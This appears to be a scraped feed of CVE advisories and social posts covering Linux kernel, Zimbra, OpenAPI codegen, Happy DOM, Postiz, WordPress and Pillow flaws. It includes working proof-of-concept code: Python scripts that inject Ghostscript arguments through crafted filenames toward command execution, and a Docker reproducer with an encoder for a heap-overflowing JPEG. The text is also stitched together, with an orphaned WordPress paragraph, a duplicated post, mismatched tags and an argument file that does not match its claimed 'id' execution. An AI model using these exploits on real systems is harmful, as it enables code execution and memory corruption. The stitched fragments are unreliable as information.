🚨 A crafted OpenAPI document can turn generated TypeScript clients into a code execution path; CVE-2026-108551

PoC: https://github.com/Zombie-Kaiser/CVE-2026-108551-POC

The flaw affects openapi-typescript-codegen and stems from unsafe interpolation inside Handlebars templates. An attacker who controls an OpenAPI document can inject JavaScript through values such as path keys, parameter names, server URLs, or version fields.

CVSS: 9.3 Critical
Affected: openapi-typescript-codegen ≤ 0.31.0
Impact: Arbitrary JavaScript execution when generated clients are imported or affected service methods are called

The PoC demonstrates how malicious OpenAPI input can survive client generation and execute once the generated code is used.

CVE-2026-108551.description: openapi-typescript-codegen through 0.31.0 contains a code injection vulnerability that allows attackers controlling an OpenAPI document to inject JavaScript by supplying unescaped values interpolated into single-quoted string literals. Attackers can embed a single quote in path keys, parameter names, servers[0].url, or info.version to execute arbitrary JavaScript when generated clients are imported or service methods called.

posts.content:
🟠 CVE-2026-99082 - High (8.8)

In the Linux kernel, the following vulnerability has been resolved:

KVM: x86: Use active memslots for the per-vCPU MMIO cache

KVM tags the per-vCPU MMIO cache with a memslot generation so that a
memslot update invalidates cached MMIO information...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-99082/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-99082.description:
In the Linux kernel, the following vulnerability has been resolved:

KVM: x86: Use active memslots for the per-vCPU MMIO cache

KVM tags the per-vCPU MMIO cache with a memslot generation so that a
memslot update invalidates cached MMIO information.  Both the fill and
validation paths use kvm_memslots(), which unconditionally selects address
space 0, even when the vCPU is running in SMM and using address space 1.

Commit 56f17dd3fbc4 ("kvm: x86: fix stale mmio cache bug") added the
memslot generation to the cache key so that a memslot update could not
leave a stale entry valid.  When commit 699023e23965 ("KVM: x86: add SMM
to the MMU role, support SMRAM address space") added the SMM address space,
these helpers were not converted to use the active memslots.

Consequently, an update to the SMM memslots can leave an entry from the old
SMM address space apparently valid after the vCPU returns to the normal
address space.  A guest can then cause an access to valid RAM at the same
GFN to be returned to userspace as KVM_EXIT_MMIO.

Completing that exit through the VMM's RAM address space writes the backing
page without going through KVM's write-tracking path.  If the page backs a
nested EPT table, KVM can continue using shadow translations derived from
the old contents.  The WARN_ON_ONCE() in kvm_mmu_write_protect_fault()
catches this invalid cache and memslot combination.

Use the vCPU's active memslots when caching and validating the entry.
Memslot generations are unique across address spaces, so the generation
also distinguishes the normal and SMM views.  This matches the MMIO SPTE
cache, which already uses kvm_vcpu_memslots().

On an unpatched current-mainline kernel, a regression test that fills the
cache in SMM and updates only the SMM memslots fails the intended RAM write
and triggers the kvm_mmu_write_protect_fault() warning.  With this change,
the same test completes the RAM write without a warning.  The x86/smm_test,
set_memory_region_test, and memslot_modification_stress_test selftests also
pass.

🟠 CVE-2026-99081 - High (7.5)

In the Linux kernel, the following vulnerability has been resolved:

bnxt_en: fix DMA mapping length for padded small packets

Stefan Fleischmann reported Intel IOMMU DMA Read faults on BCM57412
NetXtreme-E NICs when transmitting packets on VLAN/m...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-99081/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-99081.description:
In the Linux kernel, the following vulnerability has been resolved:

bnxt_en: fix DMA mapping length for padded small packets

Stefan Fleischmann reported Intel IOMMU DMA Read faults on BCM57412
NetXtreme-E NICs when transmitting packets on VLAN/macvlan interfaces:

  DMAR: [DMA Read NO_PASID] Request device [18:00.0] fault addr 0xfc499000
        [fault reason 0x06] PTE Read access is not set
  bnxt_en 0000:18:00.0 eno1np0: Abandoning msg {0xb4 0x41a} len: 0 due to firmware status: 0x2000001
  ...
  NETDEV WATCHDOG: eno1np0 (bnxt_en): transmit queue 0 timed out

The fault address (0xfc499000) is on an exact 4KB page boundary,
pointing to a DMA read buffer overrun.

In bnxt_start_xmit(), packets smaller than BNXT_MIN_PKT_SIZE (52 bytes),
such as 42-byte untagged ARP frames, are padded:

    if (length < BNXT_MIN_PKT_SIZE) {
        pad = BNXT_MIN_PKT_SIZE - length;
        if (skb_pad(skb, pad))
            goto tx_kick_pending;
        length = BNXT_MIN_PKT_SIZE;
    }

    mapping = dma_map_single(&pdev->dev, skb->data, len, DMA_TO_DEVICE);
    ...
    dma_unmap_len_set(tx_buf, len, len);

However, 'len' was initialized earlier to skb_headlen(skb) (e.g. 42 bytes)
and is left unadjusted after padding. Consequently, dma_map_single() and
dma_unmap_len_set() map and track only 42 bytes.

Later, the hardware TX buffer descriptor is programmed with the padded length:

    txbd->tx_bd_len_flags_type =
        cpu_to_le32(((len + pad) << TX_BD_LEN_SHIFT) | flags |
                    TX_BD_FLAGS_PACKET_END);

The NIC DMA engine is thus instructed to read 52 bytes from a region where
only 42 bytes were DMA-mapped. If skb->data ends near the boundary of a 4KB
page (within 'pad' bytes of the next page), the hardware DMA read overruns
into the unmapped adjacent page, triggering an IOMMU fault.

This issue was exposed after commit 447cbe95ebb9 ("vlan: fix skb_under_panic
and races when toggling HW VLAN offload") because reserving extra VLAN
headroom rounded LL_RESERVED_SPACE from 48 up to 64 bytes, shifting skb->data
offsets and potentially causing small frames to land right against page
boundaries.

Fix this by using skb_put_padto(skb, BNXT_MIN_PKT_SIZE) in
bnxt_start_xmit(), before skb_shinfo(skb)->nr_frags is sampled,
because padding might linearize the skb.
This ensures skb->len and skb_headlen(skb) reflect the padded size so
that dma_map_single() maps the full buffer and the descriptor length is
consistent. This also removes the temporary 'pad' variable and masking logic.

The padding is done after the SW USO branch, otherwise
bnxt_sw_udp_gso_xmit() would account the padding as UDP payload
and send it in extra segments.

Note that SW USO segments are still not padded: with IPv4, a segment
carrying less than 10 bytes of UDP payload (small gso_size, or a short
last segment) is sent as a frame shorter than BNXT_MIN_PKT_SIZE.
This is a separate issue, left for a followup patch.

🔴 CVE-2026-99079 - Critical (9.8)

In the Linux kernel, the following vulnerability has been resolved:

net/mlx5e: Prevent stale XSK buffer release on refill retry

When an XDP redirect to an AF_XDP socket fails because its RX ring is
full, the XSK core frees the buffer. During the...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-99079/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-99079.description:
In the Linux kernel, the following vulnerability has been resolved:

net/mlx5e: Prevent stale XSK buffer release on refill retry

When an XDP redirect to an AF_XDP socket fails because its RX ring is
full, the XSK core frees the buffer. During the subsequent batched refill
of a legacy cyclic RQ, mlx5e also releases the WQE's XSK buffer before
allocating a replacement. If that refill succeeds only partially, a WQE
left without a replacement retains its old buffer pointer.

The buffer can meanwhile be allocated to another WQE. A later refill
retry can then free the live buffer through the stale pointer and publish
the same UMEM frame twice.

Mark the WQE as released immediately after the driver-side free. The flag
is already cleared when a replacement buffer is assigned, so refill
retries no longer release stale pointers.

The failure is silent and produces no kernel warning or splat. A
standalone legacy cyclic-RQ zero-copy libxsk reproducer, using 64-byte UDP
traffic offered at 12 Mpps, detected it: stock stopped after 2,854,914
packets in 4.094 seconds, with 4,542 xdp_rx_ring_full events and 64
ownership/double-publication errors. With this change it processed
356,904,225 packets in 30 seconds despite 571,405 xdp_rx_ring_full events,
with no ownership or data errors.

CVE-2026-50057.description: A local privilege escalation vulnerability in the Zimbra Collaboration Suite (ZCS) MTA package allows the Unix zimbra account to execute arbitrary commands as root. The installed sudo policy permits passwordless root execution of Postfix administration commands without restricting their arguments. An attacker can select a zimbra-controlled daemon_directory in the Postfix configuration and invoke postfix set-permissions, causing Postfix to execute the attacker's post-install program as root. The Postfix configuration directory is also writable by zimbra, so restricting postconf alone does not remove the execution path. Exploitation requires local command execution as zimbra on an MTA node. ZCS 10.1.16 and 10.1.21 are affected.

Escalation is bounded below administrator-tier roles because `is_safe_registration_role()` rejects any role holding `manage_options`, `edit_users`, `delete_users`, `create_users`, `promote_users`, or `edit_theme_options`, meaning the highest practically reachable role on a standard WordPress installation is Editor.

posts.content:
Three critical flaws (CVE-2026-112900, CVE-2026-112393, CVE-2026-112403, CVSS 9.2 each) let a crafted EPS, TIFF, or JPEG file trigger remote code execution or heap corruption. The EPS one shells out to Ghostscript with your filename completely unguarded. That is not a bug in this tutorial. That is the mechanic.

To remove the debuff, upgrade Pillow to 13.0.0 immediately. (2/3)

CVE-2026-112900.description:
### Summary
`PIL.EpsImagePlugin.Ghostscript()` builds the Ghostscript command line using the input file path (`fp.name`) **without sanitization**, placing it at `-f <infile>`. A filename beginning with `-` is interpreted by Ghostscript as an option, giving command-line argument injection; chainable to RCE (see Impact). Reproduces with Pillow's default invocation (with `-dSAFER` enabled).

### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

#### Type
CWE-88 (Argument Injection) (→ CWE-78 (OS Command Injection) optionally, with attacker controlled text file)

#### Vulnerable Codes

```python
infile_temp = None
if hasattr(fp, "name") and os.path.exists(fp.name):
    infile = fp.name                      # user-controlled path used as-is, without validation
else:
    in_fd, infile_temp = tempfile.mkstemp()
    os.close(in_fd)
    infile = infile_temp
    # ... (copy fp into a temporary file)

# Build Ghostscript command
command = [
    gs_binary,
    "-q",
    f"-g{width:d}x{height:d}",
    f"-r{res_x:f}x{res_y:f}",
    "-dBATCH",
    "-dNOPAUSE",
    "-dSAFER",                            # default sandbox — does NOT stop this injection
    f"-sDEVICE={device}",
    f"-sOutputFile={outfile}",
    "-c",
    f"{-bbox[0]} {-bbox[1]} translate",
    "-f",
    infile,                               # injected here: inserted into argv with no check for
                                          # option prefixes (-, --) or Ghostscript's @-file token
                                          # => argument injection (CWE-88)
    "-c",
    "showpage",
]
# ...
subprocess.check_call(command, startupinfo=startupinfo)   # spawns Ghostscript
```

#### Root cause. 

When rendering an EPS image, PIL.EpsImagePlugin.Ghostscript() constructs the Ghostscript command line using the input file path (fp.name) and places it directly at the -f <infile> position of the argument list. This path is user-controllable, yet Pillow performs no validation or neutralization of tokens that Ghostscript treats specially during command-line argument parsing — in particular a leading - or -- (which Ghostscript interprets as an option rather than a filename) and a leading @ (Ghostscript's argument-file syntax, which causes it to read additional command-line arguments from the named file). Because the filename is neither normalized (e.g., forced to an absolute path or prefixed with ./) nor checked against these prefixes before being handed to the subprocess, an attacker who controls the filename passed to Image.open() can inject arbitrary Ghostscript command-line arguments. This is a classic argument-injection flaw (CWE-88), and it is not mitigated by Pillow's default -dSAFER setting.

#### Affected
- Pillow: tested on 12.3.0 (latest); vulnerable code is long-standing and appears to affect all current versions (main included).
- Component: `src/PIL/EpsImagePlugin.py`, `Ghostscript()` — `infile = fp.name`, and the command list entry `"-f", infile`.

#### Suggested fix
Normalize the filename to an absolute path before it is passed to Ghostscript, so it can never be parsed as an option (`-`/`--`) or as an argument-file token (`@`):
```python
    if hasattr(fp, "name") and os.path.exists(fp.name):
        infile = os.path.abspath(fp.name)   # was: infile = fp.name
```
`os.path.abspath()` guarantees the path starts with a path separator (or a drive letter on Windows), so a leading `-` or `@` can no longer reach Ghostscript's argument parser. The `else` branch already builds a safe `tempfile.mkstemp()` path and needs no change.

### PoC
dockerfile, Default run shows the argument-injection demo (poc.py); for the RCE PoC run python3 poc-rce.py.
```
FROM ubuntu:24.04

RUN apt update
RUN apt install -y --no-install-recommends python3 python3-venv ghostscript ca-certificates
RUN rm -rf /var/lib/apt/lists/*
RUN python3 -m venv /venv && /venv/bin/pip install --upgrade pip Pillow==12.3.0
ENV PATH=/venv/bin:$PATH
WORKDIR /poc
COPY poc.py .
COPY poc-rce.py .
COPY arg .

CMD ["python3", "poc.py"]
```
poc.py
```
import os
from PIL import Image

############################################################################################
# Attacker controlled file
############################################################################################

EPS = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 100 100\n%%EndComments\nshowpage\n"

name = "-h"
with open(name, "wb") as f:
    f.write(EPS)

############################################################################################

print(f"[*] Pillow opens a file whose name is {name!r}")
im = Image.open(name)
print(f"[*] call `load()`; this paths calls `gs` command with '-f {name}'")
try:
    im.load()
except Exception as e:
    print(f"[*] load() raised: {type(e).__name__}: {e}")

print("CWE-88: argument injection; Pillow code doesn't validate argument name")
print("        This poc.py shows the vulnerability clearly.")
print("        If Pillow checks the name of file before it uses, It won't display `help`")
```
poc-rce.py
```

from PIL import Image

############################################################################################
# Attacker controlled file
############################################################################################

EPS = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 100 100\n%%EndComments\nshowpage\n"

# To chain this vulnerability into critical RCE, We need another arbitrary text file
# In this script, it is `arg`.
name = "@arg"
with open(name, "wb") as f:
    f.write(EPS)

############################################################################################

print(f"[*] Pillow opens a file whose name is {name!r}")
im = Image.open(name)
print(f"[*] call `load()`; this paths calls `gs` command with '-f {name}'")
print(f"[*] and this leads to arbitrary command injection.")
print(f"*********************************************")
try:
    im.load()
except Exception as e:
    print(f"*********************************************")
    print(f"[*] load() raised: {type(e).__name__}: {e}")

print("")
print("CWE-78: OS Command Injection;")
print("CWE-88: Argument Injection  ; Pillow code doesn't validate argument name")
print("        This poc.py shows the vulnerability clearly.")
print("        If Pillow checks the name of file before it uses, It won't call `id`")
```

```
-c
1

```

### Impact
**Confirmed — Ghostscript argument injection.** Because the filename is not validated, a leading `-`/`--` is parsed by Ghostscript as an option rather than a file. An attacker who controls the filename passed to `Image.open()` can therefore inject a Ghostscript command-line argument. Single-argument injection always succeeds.

**Potential RCE (verified).** The filename is also not validated against Ghostscript's `@`-file syntax: a filename of the form `@<path>` causes Ghostscript to read additional command-line arguments from `<path>`, allowing multiple arguments to be injected at once. If the attacker can additionally control the referenced file, this can be escalated to arbitrary command execution — an escalation we verified in our PoC (execution of `id`).

Applies under Pillow's default configuration (with `-dSAFER` enabled), on Pillow 12.3.0 with Ghostscript 10.02.1. With same GS arguments, I also confirmed RCE with latest GS version (10.07.1)

### Why this is a Pillow bug (not the documented "block untrusted EPS" risk)
This is not the malicious-EPS-content risk described in Pillow's security policy: the flaw is triggered by the filename, not by anything in the PostScript document. A completely benign EPS file still results in Ghostscript argument injection whenever the filename passed to Image.open() is attacker-influenced, so applications that legitimately process EPS remain affected — the guidance to block untrusted EPS input does not cover this.
Because Pillow is the component that constructs the Ghostscript command line, ensuring a filename cannot be reinterpreted as an option (-/--) or an argument-file token (@) is Pillow's responsibility, not that of every downstream caller. The precondition — attacker influence over a filename that reaches Image.open() — is realistic (e.g., file-upload endpoints that preserve or derive the stored name from user input), and chaining it with this flaw yields RCE in practice, not just in theory. A one-line normalization (os.path.abspath(fp.name)) closes it without any change to how applications use the API.

CVE-2026-112393.description: Pillow is a Python imaging library. From 2.0.0 until 13.0.0, Pillow has a heap buffer overflow and stale-heap disclosure in _tiffWriteProc when saving compressed TIFF data through libtiff to a target without a usable fileno(), such as BytesIO. File paths and targets with real file descriptors are unaffected. This issue is fixed in version 13.0.0.

Three critical flaws (CVE-2026-112900, CVE-2026-112393, CVE-2026-112403, CVSS 9.2 each) let a crafted EPS, TIFF, or JPEG file trigger remote code execution or heap corruption. The EPS one shells out to Ghostscript with your filename completely unguarded. That is not a bug in this tutorial. That is the mechanic.

To remove the debuff, upgrade Pillow to 13.0.0 immediately. (2/3)

CVE-2026-112403.description:
## Summary

`JpegImageFile.draft()` — which `Image.thumbnail()` calls automatically — requests 1/2, 1/4 or 1/8 scaled JPEG output and shrinks `self._size` and the tile extents to match, so `_setimage()` allocates a single-row decode buffer of `ceil(W/s)` samples. `ImagingJpegDecode()` sets `cinfo.scale_num`/`scale_denom`, calls `jpeg_start_decompress()`, and then reads scanlines into that buffer without ever comparing `cinfo.output_width`, `cinfo.output_height` or `cinfo.out_color_components` against `state->xsize`, `state->ysize` and `state->bits`.

libjpeg-turbo 3.x decodes lossless (SOF3) JPEG, but hardwires lossless streams to no scaling — the requested `scale_denom` is silently discarded. It therefore returns full-width `W`-sample rows into a buffer sized for `ceil(W/s)`. Each `jpeg_read_scanlines()` call writes `(W - ceil(W/s)) x components` bytes past the end of the heap allocation, and the overflowing bytes are the decoded pixel values, which are byte-exact for an 8-bit grayscale lossless image.

The input is a standards-compliant JPEG, so `Image.open(..., formats=["JPEG"])` does not prevent it. Pillow's Python SOF parser already accepts marker `0xFFC3` ("SOF3", "Spatial lossless") at 8-bit precision, so the file opens normally as a `JPEG` / mode `L` image at its full declared size.

## Affected code

At `e41083f383c9cd3db95de52564cc0b6452313d4a` (`main`, 2026-08-29):

- `src/libImaging/JpegDecode.c:224-262` — `ImagingJpegDecode()`; `jpeg_start_decompress()` at :240, `jpeg_read_scanlines()` at :252, with no geometry check between them.
- `src/decode.c:222-231` — `_setimage()`; `state->buffer = calloc(1, state->bytes)` with `state->bytes = (state->bits * state->xsize + 7) / 8`.
- `src/PIL/JpegImagePlugin.py:428-464` — `JpegImageFile.draft()`; computes `s` and shrinks `_size`, the tile extents and `decoderconfig` with no notion of lossless coding.
- `src/PIL/JpegImagePlugin.py:271` — `0xFFC3: ("SOF3", "Spatial lossless", SOF)`.

```c
// src/libImaging/JpegDecode.c
            if (context->scale > 1) {
                context->cinfo.scale_num = 1;
                context->cinfo.scale_denom = context->scale;
            }
            ...
        case 2:
            if (!jpeg_start_decompress(&context->cinfo)) {
                break;
            }
            state->state++;
            /* fall through */
        case 3:
            ok = 1;
            while (state->y < state->ysize) {
                ok = jpeg_read_scanlines(&context->cinfo, &state->buffer, 1);
```

Because `state->ysize` (`ceil(H/s)`) can never equal libjpeg's `output_height` when `s >= 2`, the decode always ends in an error after the rows have already been written: the caller sees an exception and gets no pixels back. The `OSError` is a consequence of the overflow, not the issue being reported.

## Primitive

Per scanline: a contiguous write of `(W - ceil(W/s)) x c` bytes immediately past a `calloc(ceil(W/s) x c)` block, where `c = 1` for mode `L` and 4 for RGB (RGBX) and CMYK; repeated for `ceil(H/s)` rows over the same region. The buffer size class is chosen by the attacker through `W`, and for grayscale the overflowing content is an arbitrary attacker-chosen byte string.

Measured in the reproducer below: 1200x1100 mode `L`, `s=2` — a 600-byte allocation, 600 bytes written past it, ASan reporting the whole 1200-byte row write as one `memcpy`.

Threshold: `draft()` must select `s >= 2`, i.e. `W // requested_w >= 2` and `H // requested_h >= 2`. For `thumbnail((256,256))` with the default `reducing_gap=2.0` that means `W, H >= 1024`.

## Reproduction

Self-contained Docker reproducer (Ubuntu 24.04, clang 20, libjpeg-turbo 3.1.4 and Pillow both built from source with `-fsanitize=address`; Pillow checked out at `${TARGET_COMMIT}`, default `e41083f383c9cd3db95de52564cc0b6452313d4a`). Save the three files below as `Dockerfile`, `make_sof3.py` and `trigger.py` in an empty directory, then:

```bash
docker build -t pillow-sof3-oob . && docker run --rm pillow-sof3-oob
```

`make_sof3.py` is a self-contained encoder that emits a standards-compliant 8-bit grayscale lossless-Huffman JPEG (SOI / DHT / SOF3 `P=8, Y=1100, X=1200, Nf=1` / SOS `Ss=1` predictor 1, `Se=0`, `Ah=Al=0` / entropy-coded row differences / EOI), whose rows carry a repeating marker pattern. `trigger.py` opens it and calls `thumbnail()`, whose implicit `draft()` picks `s=2` and allocates a 600-byte row buffer.

### `Dockerfile`

```dockerfile
FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
ARG TARGET_COMMIT=e41083f383c9cd3db95de52564cc0b6452313d4a
ARG CLANG_VERSION=20
ARG LIBJPEG_TURBO_TAG=3.1.4

RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates git make cmake nasm pkg-config libc6-dev gcc \
        wget gnupg lsb-release software-properties-common \
        python3 python3-dev python3-pip python3-venv zlib1g-dev \
    && wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh && chmod +x /tmp/llvm.sh && /tmp/llvm.sh ${CLANG_VERSION} \
    && apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \
    && rm -rf /var/lib/apt/lists/*

ENV CC=clang-20
ENV CXX=clang++-20
ENV CFLAGS="-g -fno-omit-frame-pointer -O1 -fsanitize=address"
ENV CXXFLAGS="-g -fno-omit-frame-pointer -O1 -fsanitize=address"
ENV LDFLAGS="-fsanitize=address"

# --- libjpeg-turbo 3.x (lossless SOF3 support) built with ASan ---
RUN git clone https://github.com/libjpeg-turbo/libjpeg-turbo /src/libjpeg-turbo
RUN cd /src/libjpeg-turbo && git checkout ${LIBJPEG_TURBO_TAG} \
    && cmake -B /build/ljt -S . -DCMAKE_BUILD_TYPE=None \
        -DCMAKE_C_COMPILER=clang-20 \
        -DCMAKE_C_FLAGS="$CFLAGS" \
        -DCMAKE_EXE_LINKER_FLAGS="$LDFLAGS" \
        -DCMAKE_SHARED_LINKER_FLAGS="$LDFLAGS" \
        -DCMAKE_INSTALL_PREFIX=/opt/ljt -DWITH_JPEG8=0 -DENABLE_STATIC=0 \
    && cmake --build /build/ljt -j"$(nproc)" && cmake --install /build/ljt

# --- Pillow at the pinned commit, built with ASan against that libjpeg ---
RUN git clone https://github.com/python-pillow/Pillow /src/repo
WORKDIR /src/repo
RUN git checkout ${TARGET_COMMIT}

ENV JPEG_ROOT=/opt/ljt
ENV LD_LIBRARY_PATH=/opt/ljt/lib
RUN python3 -m venv /venv \
    && /venv/bin/pip install --quiet --upgrade pip "setuptools>=80" wheel pybind11 \
    && CFLAGS="$CFLAGS" LDFLAGS="$LDFLAGS -Wl,-rpath,/opt/ljt/lib" \
       /venv/bin/pip install --no-build-isolation --no-deps . \
    && ln -sf "$(clang-20 -print-file-name=libclang_rt.asan-x86_64.so)" /opt/libasan.so \
    && LD_PRELOAD=/opt/libasan.so ASAN_OPTIONS=detect_leaks=0 \
       /venv/bin/python3 -c "from PIL import Image, features; print(Image.__version__, features.version('jpg'))"

COPY make_sof3.py /tmp/make_sof3.py
COPY trigger.py /tmp/trigger.py
RUN python3 /tmp/make_sof3.py /tmp/sof3_gray_1200x1100.jpg

ENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1
ENV ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-20/bin/llvm-symbolizer
ENV LD_PRELOAD=/opt/libasan.so
CMD ["/bin/sh","-c","cd /tmp && /venv/bin/python3 /tmp/trigger.py 2>&1; echo EXIT=$?"]
```

### `make_sof3.py`

```python
#!/usr/bin/env python3
"""Generate an 8-bit grayscale lossless-Huffman (SOF3) JPEG.

Standards-compliant per ITU-T T.81 Annex H (lossless mode), predictor 1 (Ra).
Rows carry an attacker-chosen marker byte pattern verbatim (lossless => exact).
"""
import struct
import sys

W = 1200
H = 1100
MARKER = b"AAAABBBBCCCCDDDD"  # attacker-chosen bytes that land past the buffer


class BitWriter:
    def __init__(self):
        self.out = bytearray()
        self.acc = 0
        self.n = 0

    def put(self, value, nbits):
        for i in range(nbits - 1, -1, -1):
            self.acc = (self.acc << 1) | ((value >> i) & 1)
            self.n += 1
            if self.n == 8:
                self.out.append(self.acc)
                if self.acc == 0xFF:
                    self.out.append(0x00)  # byte stuffing
                self.acc = 0
                self.n = 0

    def flush(self):
        while self.n:
            self.put(1, 1)
        return bytes(self.out)


# Canonical Huffman: 17 symbols (categories 0..16), all of code length 5.
BITS = [0] * 17
BITS[5] = 17
HUFFVAL = list(range(17))
CODES = {sym: (i, 5) for i, sym in enumerate(HUFFVAL)}


def category(d):
    if d == 0:
        return 0
    return abs(d).bit_length()


def build_pixels():
    rows = []
    for y in range(H):
        row = bytearray()
        while len(row) < W:
            row += MARKER
        rows.append(bytes(row[:W]))
    return rows


def main(path):
    rows = build_pixels()
    bw = BitWriter()
    prev = None
    for y in range(H):
        row = rows[y]
        for x in range(W):
            s = row[x]
            if y == 0 and x == 0:
                pred = 1 << 7          # 2^(P-1-Pt)
            elif x == 0:
                pred = prev[0]         # Rb for first sample of a line
            else:
                pred = row[x - 1]      # Ra, predictor 1
            d = (s - pred) & 0xFFFF
            if d >= 0x8000:
                d -= 0x10000
            ssss = category(d)
            code, length = CODES[ssss]
            bw.put(code, length)
            if ssss:
                v = d if d > 0 else d + (1 << ssss) - 1
                bw.put(v & ((1 << ssss) - 1), ssss)
        prev = row
    entropy = bw.flush()

    out = bytearray()
    out += b"\xff\xd8"                                        # SOI
    # DHT: class 0 (DC/lossless), table id 0
    dht = bytes([0x00]) + bytes(BITS[1:17]) + bytes(HUFFVAL)
    out += b"\xff\xc4" + struct.pack(">H", len(dht) + 2) + dht
    # SOF3: lossless, Huffman, sequential
    sof = struct.pack(">BHHB", 8, H, W, 1) + bytes([1, 0x11, 0])
    out += b"\xff\xc3" + struct.pack(">H", len(sof) + 2) + sof
    # SOS: Ns=1, Cs=1, Td=0/Ta=0, Ss=1 (predictor 1), Se=0, Ah=0/Al=0
    sos = bytes([1, 1, 0x00, 1, 0, 0])
    out += b"\xff\xda" + struct.pack(">H", len(sos) + 2) + sos
    out += entropy
    out += b"\xff\xd9"                                        # EOI
    with open(path, "wb") as f:
        f.write(bytes(out))
    print(f"wrote {path}: {len(out)} bytes, {W}x{H} 8-bit grayscale SOF3 lossless")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "/tmp/sof3_gray_1200x1100.jpg")
```

### `trigger.py`

```python
import sys
from PIL import Image, features
print("Pillow", Image.__version__, "| libjpeg", features.version("jpg"), flush=True)
im = Image.open("/tmp/sof3_gray_1200x1100.jpg")
print("format=%s mode=%s size=%s" % (im.format, im.mode, im.size), flush=True)
print(">>> im.thumbnail((256, 256))  # draft() picks s=2 -> 600-byte row buffer", flush=True)
sys.stdout.flush()
try:
    im.thumbnail((256, 256))
    print("thumbnail returned, size=%s" % (im.size,), flush=True)
except Exception as e:
    print("exception: %r" % (e,), flush=True)
```

Validated output:

```
Pillow 13.0.0.dev0 | libjpeg 6.2
format=JPEG mode=L size=(1200, 1100)
>>> im.thumbnail((256, 256))  # draft() picks s=2 -> 600-byte row buffer
=================================================================
==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x74e4e904aad8 at pc 0x7784ea4f9422
WRITE of size 1200 at 0x74e4e904aad8 thread T0
    #0 __asan_memcpy
    #1 jcopy_sample_rows /src/libjpeg-turbo/src/wrapper/../jutils.c:121:5
    #2 sep_upsample /src/libjpeg-turbo/src/wrapper/../jdsample.c:100:3
    #3 process_data_simple_main /src/libjpeg-turbo/src/wrapper/../jdmainct.c:317:3
    #4 jpeg_read_scanlines /src/libjpeg-turbo/src/wrapper/../jdapistd.c:359:3
    #5 ImagingJpegDecode /src/repo/src/libImaging/JpegDecode.c:252:22
    #6 _decode /src/repo/src/decode.c:132:14

0x74e4e904aad8 is located 0 bytes after 600-byte region [0x74e4e904a880,0x74e4e904aad8)
allocated by thread T0 here:
    #0 calloc
    #1 _setimage /src/repo/src/decode.c:230:34

SUMMARY: AddressSanitizer: heap-buffer-overflow in __asan_memcpy
```

Negative control, same image: a baseline DCT JPEG of identical dimensions thumbnails cleanly, because libjpeg honours 1/2 scaling exactly as `draft()` computed it.

```
control baseline DCT JPEG: JPEG L (1200, 1100)
thumbnail OK, size = (256, 235) -- no ASan report
```

## Scope and caveats

- Reproduced on `main` at `e41083f383c9cd3db95de52564cc0b6452313d4a`, which is current `origin/main` as of 2026-08-30. Also reported against 12.3.0.
- Requires the linked libjpeg to support lossless decoding, i.e. libjpeg-turbo >= 3.0. That is what the official Pillow wheels bundle. Builds against libjpeg-turbo 2.x or IJG libjpeg reject SOF3 before any row is decoded and are not affected.
- No non-default Pillow configuration is involved: `Image.thumbnail()` calls `draft()` by default, and the triggering bytes are entirely file data.
- Only paths that use `draft()` before loading are affected. `open().load()` and `resize()` decode at scale 1 and are unaffected. Calling `img.load()` before `thumbnail()`, or `thumbnail(..., reducing_gap=None)`, avoids the path in an application today.
- Not affected on the same code path: SOF11 (arithmetic lossless) fails with `JERR_ARITH_NOTIMPL` before any row; 12- and 16-bit lossless are rejected by Pillow's `SOF()` because it requires `bits == 8`; SOF5-7/13-15 fail with `JERR_SOF_UNSUPPORTED`.

CVE-2026-115895.description: Happy DOM is a JavaScript implementation of a web browser without its graphical user interface. From 17.0.0 until 21.0.4, packages/happy-dom/src/module/ECMAScriptModuleCompiler.ts accepts a named ESM import alias without validating that it is a JavaScript binding identifier before inserting it into a generated destructuring binding. With enableJavaScriptEvaluation enabled, attacker-controlled HTML or module source can use an invalid alias that becomes a valid default initializer after compilation, causing the generated JavaScript to execute in the Node.js host process. The demonstrated reachable path uses a JSON module import attribute, which prevents the malicious alias from being emitted again in a later ESM circular-import assignment and keeps the generated function syntactically valid. This incomplete fix for CVE-2026-33943 is a distinct residual path because the earlier remediation validated the local export importName path but not the named-import alias. This issue is fixed in version 21.0.4.

CVE-2026-115931.description:
Postiz lets a signed-in user ask the backend to run a function on one of their connected channels. The backend did not restrict which functions can be requested, so a user could call internal helper functions that were never meant to be reachable from the web interface.

One of those helpers reads a file from the server's disk. A user who connects a channel whose stored token is a file path can have the backend return the contents of any file it can read, including its environment, which holds the secret used to sign login sessions, the database address and the credentials of connected services. Another helper makes the backend process exit with a single request. Self-registration is open by default, so no existing account and no action by another user is needed.

CVE-2026-115806.description: The Prime Mover – Backup and Migration plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 2.2.1 via deserialization of untrusted input in the migration search-and-replace routine (recursiveUnserializeReplace()). An unauthenticated attacker can store a crafted, base64-encoded serialized object in wp_comments.comment_content through the standard comment-submission endpoint (wp-comments-post.php). When an administrator subsequently performs a routine Prime Mover export or restore, the plugin base64-decodes that stored value and passes it to unserialize() with no allowed_classes restriction. A Property-Oriented Programming (POP) chain is present in the plugin's own bundled Freemius library (FS_Clone_Manager::__set → FS_Option_Manager::set_option → store() → update_option()), so no additional plugin or theme is required — the plugin ships the gadget itself.

